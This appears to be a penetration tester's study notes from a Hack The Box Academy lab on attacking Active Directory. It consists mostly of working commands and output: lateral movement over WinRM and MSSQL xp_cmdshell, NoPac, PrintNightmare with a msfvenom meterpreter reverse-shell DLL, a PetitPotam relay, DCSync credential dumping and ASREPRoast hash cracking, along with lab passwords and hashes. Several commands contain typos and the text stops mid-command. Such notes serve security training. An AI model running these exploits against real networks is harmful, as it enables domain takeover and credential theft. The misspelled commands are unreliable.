# Privilege Access
-----
There are several ways for us to move around Windows domain
	- Remote Desktop Protocol: GUI protocol gives us access to hosts
	- PowerShell Remoting: allow us to create Shell sessions on a remote host
	- MSSQL Server: Account with sysadmin privileges on SQL server instance can log into the instance remotely and execute queries.

Enumeration: [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp), [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote) and [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

## Remote Desktop
### Enumeration
```PowerShell
Import-Module ./PowerView.ps1
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

- This can also be checked via BloodHound

## WinRM
### Enumeration
```PowerShell
Get-NetLocalGroupmember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Mangaement Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

- We can use this custom `Cypher query` in BloodHound
```PowerShell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

### Using [Enter-PSSession](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)
```PowerShell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT/forend',$password)
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-DB01
[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
```

### Using [Evil-Winrm](https://github.com/Hackplayers/evil-winrm)
- Installation
```bash
gem install evil-winrm
```

- Connect to a target with Evil-WinRM and valid credentials
```bash
evil-winrm -i $IP -u forend
```

## SQL Server Admin
### Enumeration
- In BloodHound, we can try the following `cypher query`
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

- We can use ACL rights to authenticat with the `wley` user, change the password of `damundsen` user and the authenticate with the target using a tool such as [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

### Enumerate  MSSQL Instances with PowerUpSQL
```PowerShell
Import-Module ./PowerUpSQL.ps1
Get-SQLINstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

- We can authenticate against the remote SQL server host using `damundsen`. Note, at this point, we have already changed `damundsen` user's password to "SQL1234!"
```PowerShell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1  
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```


### mssqlclient.py
- Running `mssqlclient.py` against the target
```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

- Once connected to the MSSQL server, we can enable x[p_cmdshell stored procedure](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15), which allows the user (who has the proper rights) to execute OS commands.
```bash
SQL> enabel_xp_cmdshell
```

- Enumerate users' rights on the system using xp_cmdshell
```bash
xp_cmdshell whoami /priv
```


-----
# Kerberoasting "Double Hop" Problem
-----
- This happens when using WinRM/PowerShell. These to only provide authentications ticket on a specific resource. The user's password is not cached as part of their login. NTLM hash is only stored in memory when using PSExec or SMB. Therefore, when using mimikatz after WInRM, we won't see any passwords. PSExec, on the contrary, does have NTLM hash saved in memory.
- There are indeed processes running in the context of the backupadm user, such as wsmprovhost.exe, which is the process that spawns when a Windows Remote PowerShell session is spawned.
```PowerShell
[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
wsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\backupadm
                             0:00:03 N/A
tasklist.exe                  6532 Services                   0      7,988 K Unknown         INLANEFREIGHT\backupadm
                             0:00:00 N/A
conhost.exe                   7048 Services                   0     12,656 K Unknown         INLANEFREIGHT\backupadm
```

![](https://academy.hackthebox.com/storage/modules/143/double_hop.png)
1. Attackers use WinRM to authenticate against the Dev01 machine. 
2. On Dev01 machine, we need to run PowerView to enumerate domains to get to DC01
3. Since we use WInRM, no password is saved in the memory -> DC01 has no ways to confirm our authentication -> can't enumerate the domain

### Workarounds
- Several workarounds can be found in this [post](https://posts.slayerlabs.com/double-hop/)

#### Workaround #1: PSCredential Object
- Checking the Kerberos tickets, we can only see one for the current server (`Server: academy-aen-ms0$ @`)
```PowerShell
klist

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

- After getting onto DEV1 machine using WinRM, create a PSCredential object
```PowerShell
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```

- Create a new SPN
```PowerShell
get-domainuser -spn -credential $Cred | select samaccountname
```

- Now, using `klist` again, we can see Kerberos tickets for DC01(`krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL`)
```command-session
klist 

Current LogonId is 0:0x1e5b8b

Cached Tickets: (4)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL

        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION

        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#2>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96

        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#3>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

#### Workaround #2: Register PSSession Configuration
- Establish connection to the DEV1:
```PowerShell
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

- Checking for cached ticket using `klist`, we get the same issue (`HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL`)
```PowerShell
klist

Current LogonId is 0:0x11e387

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
       Start Time: 6/28/2022 9:09:19 (local)
       End Time:   6/28/2022 19:09:19 (local)
       Renew Time: 0
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x8 -> ASC
       Kdc Called:
```

- We cant directly interact with DC using PowerView

- Use [Register-PSSessionConfiguration](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) to register a new session configuration
```PowerShell
Register-PSSessionConfiguration -Name backupadm -RunAsCredential inlanefreight\backupadm

<SNIP>
   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin

Type            Keys                                Name
----            ----                                ----
Container       {Name=backupadmsess}                backupadmsess
```

- Restart WinRM service
```PowerShell
Restart-Service WinRM
```

- We're kicked out of the session. Start a new PSSession with the configuration name
```PowerShell
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmess
klist 

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
       Start Time: 6/28/2022 13:24:37 (local)
       End Time:   6/28/2022 23:24:37 (local)
       Renew Time: 7/5/2022 13:24:37 (local)
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x1 -> PRIMARY
       Kdc Called: DC01
```

- Now we can run PowerView to enumerate the domain
```PowerShell
get-domainuser -spn | select samaccountname
```

# BLEEDING EDGE VULNERABILITY
-----
## NoPac (SamAccountName Spoofing)
- [Sam_The_Admin vulnerabilit](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699) is one of the most recent threat involving [CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)
- We change the name of the new host to match a Domain Controller's SamAccountName -> request Kerbberos tickets cuasing the service to issue us tickets under the DC's name -> gain privileges.
- Install Impacket
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install
```

- Cloning NoPac Exploit Repo
```bash
git clone https://github.com/Ridter/noPac.git
```

- Scanning for NoPac
```bash
sudo python3 scanner.py inlanefregiht.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Look for ms-DS-MachineAccountQuota. If it's set to 10, meaning it is vulnerable. If the value is set to 0, it meas the current user will not have the rights to add a new machine
```

- Running NoPac & Getting a Shell
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

- NoPac save the TGT in the directory of the PWNBOX
```bash
ls
administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

- Using NoPac to DCSync the Built-In Administrator Account
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

- Windows Defender & SMBEXEC.py Considerations: if AV is enabled, our shell is established but the commands may fail.

## PrintNightmare
- Involved two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)), allowing privilege escalation and remote code execution.
- Use [cub0x0's](https://github.com/cube0x0/CVE-2021-1675) for exploitation
```bash
# Clone from git
git clone https://github.com/cube0x0/CVE-2021-1675

# Installation
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

- Use `rpcdump.py` to see if `Print System Asynchronous Protocol` & `Print System Remote Protocol` are exposed on the target.
```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

- Generate DLL Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

- Create a share with smbserver.py
```bash
smbserver.py -smb2support CompData /$PATH_TO_backupscript.dll
```

- Create a listener in Metasploit
- Run the exploit
```shell
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```


## PetitPotam (MS-EFSRPC)
- [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) is an LSA spoofing vulnerability that allows unauthenticated attackers to coerce a DC to authenticate against another host using NTLM via Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft's  [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
- Start ntlmrelayx.py in PWNBOX
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACDEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

- In another window, run [PetitPotam.py](https://github.com/topotam/PetitPotam)
```bash
python3 PetitPotam.py $PWNBOX_IP $DC_IP
```

- Catch Base64 Encoded Certificate for DC01 when going back to the `ntlmrelayx.py` window
```shell-session
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
MIIStQIBAzCCEn8GCSqGSIb3DQEHA ... <SNIP>
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
```

- Request a TGT Using Gettgtpkinit.py
```shell
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

- Setting the KRB5CCNAME Environment Variable
```bash
export KRB5CCNAME=dc01.ccache
```

- Use Domain Controller TGT to DCSync
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

- Running `klist`
```bash
klist

Ticket cache: FILE:dc01.ccache
Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

- Confirm Admin Access to the Domain Controller
```shell-session
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

- Submitting a TGS Request for Ourselves Using getnthash.py
We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.
```bash
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

- Use Domain Controller NTLM hash to DCSync
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

- Request TGT and Perform PTT with DC01$ Machine Account
```PowerShell
Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:...<SNIP>... /ptt
```

- Use `klist` to confirm the ticket is in memory

- Perform DCSync with Mimikatz
```PowerShell
lsadymp::dcsync /user:inlanefreight\krbtgt
```

# MISCELLANEOUS MISCONFIGURATION
-----

## Exchange Related Group Membership
- Default Exchange installation can lead to multiple possible attack vectors. Members in `Exchange Windows Persmissions` has the ability to write DACL to domain object -> can be leveraged to give a user DCSync privileges.
- This [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) shows a few techniques for leveraging Exchange to escalate privileges in the AD environment.

### PrivExchange
- Result from Exchange Server `PushSubscription`, allowing domain users with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP

### Printer Bug
- A flaw in MS-RPRN protocol (Print System Remote Protocol), which defines the communication of print job processing and print system management btw a client and a print server.
- Users connect to the spool's named pipe with `RpcOpenPrinter` method -> User `RpcRemoteFindFirstPrinterChangeNotificationEx` method -> forces the server to authenticate to any host provided by the client over SMB

- Enumerate for MS-PRN Printer Bug
```PowerShell
Import-Module SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True

# This indicate the machine is vulnerable to Printer Bug
```

### MS14-068
- Result from flaws of Kerberos protocols
- A Kerberos contains information about users in PAC (Privilege Attribute Certificate), which is signed by KDC using secret keys to make sure it's not been tampered since creation.
- Attackers forge PAC to be accepted by KDC.
- Can be exploited with tools like [Python Kerberos Exploitation Kit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)

### Enumerate DNS Records
- We use [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS recors in a domain using a valid domain user.
- On the first run of the tool, we can see that some records are blank, namely `?,LOGISTICS,?`.
```PowerShell
adidnsdump -u inlanefreight\\forend ldap:\\172.16.5.5

# If we run with -r flag, the tool will run A query, which resolve unknow records
```

- View the result
```bash
head records.csv
```

## Other Misconfigurations
#### Passwords in Description Field
```PowerShell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

## PASSWD_NOTREQD Field
#### Checking for PASSWD_NOTRQD Setting using Get-DomainUser
- If an account with the `passwd_notreqd` field set, the user is not subject to the current password policy.
```PowerShell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## Credentials in SMB shares and SYSVOL scripts
- Discover interesting scripts
```PowerShell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

- Finding a password in the script
```PowerShell
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

## Group Policy Preferences (GPP) Passwords
- When a new GPP is created, an xml file is created in SYSVOL share, which is cached locally that the Group Policy applies to. These files can be included to use:
	- Map drives (drives.xml)
	- Create local users
	- Create printer config files (printers.xml)
	- Creating and updating services (services.xml)
	- Creating scheduled tasks (scheduledtasks.xml)
	- Changing local admin passwords.
- These files can contain configuration data and passwords. the `cpassword` attribute value can be 
- View Groups.xml
![](https://academy.hackthebox.com/storage/modules/143/GPP.png)
- Decrypt the password with `gpp-decrypt`
```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

- Locate & Retrive GPP passwords with Crackmapexec
```bash
crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

- Use CrackMapExec's gpp_autologin Module
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

 - We retrieve credentials of guarddesk.

## ASREPRoasting
- It is possible to acquire TGT of an account if it has  [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) enabled.
- The authentication service  reply (AS_REP) is encrypted with the account's password, and any domain user can request it.
- If an attacker has `GenericWrite` or `GenericAll` permission over and account, they can enable this attribute and obtain AS-REP ticket for offline cracking.

- Enumerate for DONT_REQ_PREAUTH value using Get-DomainUser
```PowerShell
Get-DomainUser -PreauthNotRequired | Select samaccountname, userprincipalname, useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

- With this information, we can use Rubeus to retrieve AS-REP.
```PowerShell
Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

- Cracking the hash using Hashcat
```bash
hashcat -m 18200 ilfreight_asrep rockyou.txt
```

### Enumerate users that do not require Kerberos pre-authentication with Kerbrute
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

- With the list of users, we use Get-NPUsers.py to hunt for all users with Kerberos pre-authentication not required.
```bash
GetNPUsers.py INLANEFREIGHT.LOCA/ -dc-ip 172.15.4.4 -no-pass -userfile valid_ad_users
